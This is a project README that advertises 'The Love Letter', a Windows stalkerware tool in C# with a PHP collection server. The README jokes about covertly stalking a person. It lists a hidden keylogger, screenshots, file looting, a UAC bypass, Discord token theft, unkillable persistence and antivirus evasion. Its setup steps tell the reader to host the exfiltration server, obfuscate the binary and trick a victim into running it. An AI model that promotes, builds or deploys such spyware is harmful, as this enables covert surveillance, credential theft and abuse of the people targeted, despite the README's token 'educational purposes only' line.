﻿<div>
  <img width="220" height="210" align="left" src="https://i.ibb.co/1XbwZfX/image-removebg-preview-5.png" alt="LoveLetter"/>
  <br>
  <h1>The Love Letter</h1>
  <p>"Stalking is when two people go for a long romantic walk together but only one of them knows about it."</p>
</div>

![forthebadge](https://forthebadge.com/images/badges/built-with-love.svg)
![forthebadge](https://forthebadge.com/images/badges/made-with-reason.svg)

<br/>

## What is The Love Letter?
An all-around tool for afk stalking ❤️ logs everything on the unfortunate person's computer from top to bottom while being as stealthy as possible

> [**Server-sided PHP file included**](Server/TellMe.php)

For educational purposes only 🤷‍♀️
## What do I offer?
- Undetectable keylogger
- A smart event-based screenshot
- Windows activity logger (like [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon))
- **Looting via file upload - faster and less buggier than email**
- UAC bypass, credits to [UACME](https://github.com/hfiref0x/UACME) - get admin access without the annoying UAC confirmation
- Discord token stealer (sounds cool so decided to add it here)
- Doesn't require anything to install on the target Windows 10 system
> Hates task manager, it really does
<p align="center">
 <img src="https://s6.gifyu.com/images/Animation433b9dfdd93f8619.gif"/>
</p>

- Turns itself into a system process, **basically unkillable** on Task Manager
- Add startup via task (you can't see it on Task Manager's startup tab)
- Silent and lightweight, noone will ever notice it's running
> Portability and Flexibility
- Compiled on 32-bit, can run on both 32 and 64-bit os
- Libraries are embedded, compiles into a single executable below 1MB
- Copies itself to the unfortunate person's machine (or desired folder)
- Transmissions (such as keylogs and screenshots) are stacked whenever the target has no internet connection and sends them on the opportune moment
> Stealthy
- Can copy a target process' manifest (editable, by default a random process from System32) basically copies its process name, file version, **icon** and filename
- Randomly turns into another process from System32 every startup
- Compiles code snippets at runtime - useful to not get detected by the AV


and many more, I just don't feel like writing it all here. Explore the source code for yourself and see

## Setup...
## Prerequisites
- Visual Studio 2019 or later
- Basic knowledge in C#
- At least 3 braincells
## Building
1. First you need a server, you may use any free web-hosting service as long as it has PHP, upload [TellMe.php](Server/TellMe.php) there
1. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) pointing to [TellMe.php](Server/TellMe.php) on your server
<p align="center">
 <img src="https://i.ibb.co/B49BjLd/image.png"/>
</p>
1. Compile, to prevent peeking (reverse engineering) I suggest you may want to [obfuscate the letter](https://github.com/yck1509/ConfuserEx) 
1. Now all you need is to gain senpai's trust and run the program on his laptop, goodluck!

# Contributions
Contributions are more than welcome :)
# License
The Love Letter is licensed under the MIT License
<img height="50" align="right" src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MIT_logo.svg" alt="LoveLetter"/>
